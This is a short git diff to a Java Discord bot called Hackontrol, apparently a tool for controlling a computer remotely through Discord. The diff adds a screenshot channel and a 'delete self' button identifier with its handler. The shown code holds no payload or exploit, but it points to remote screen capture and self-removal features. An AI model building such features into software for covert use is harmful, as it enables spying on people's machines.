@@ -6,6 +6,7 @@ import java.util.function.Consumer;
 
 import com.khopan.hackontrol.button.ButtonInteraction;
 import com.khopan.hackontrol.channel.ControlChannel;
+import com.khopan.hackontrol.channel.ScreenshotChannel;
 import com.khopan.hackontrol.utils.DiscordUtils;
 
 import net.dv8tion.jda.api.JDA;
@@ -20,6 +21,8 @@ import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class Hackontrol {
+	public static final String DELETE_SELF_IDENTIFIER = "hackontrolSpecialDeleteSelf";
+
 	private static Hackontrol INSTANCE;
 
 	private final JDA bot;
@@ -66,6 +69,7 @@ public class Hackontrol {
 
 	private void addChannel() {
 		this.channelList.add(new ControlChannel());
+		this.channelList.add(new ScreenshotChannel());
 	}
 
 	private void registerButtonHandler(String buttonIdentifier, Consumer<ButtonInteraction> action) {
@@ -117,6 +121,11 @@ public class Hackontrol {
 				}
 
 				Hackontrol.this.questionCallback = null;
+				return;
+			}
+
+			if(Hackontrol.DELETE_SELF_IDENTIFIER.equals(identifier)) {
+				interaction.consume();
 				return;
 			}
 
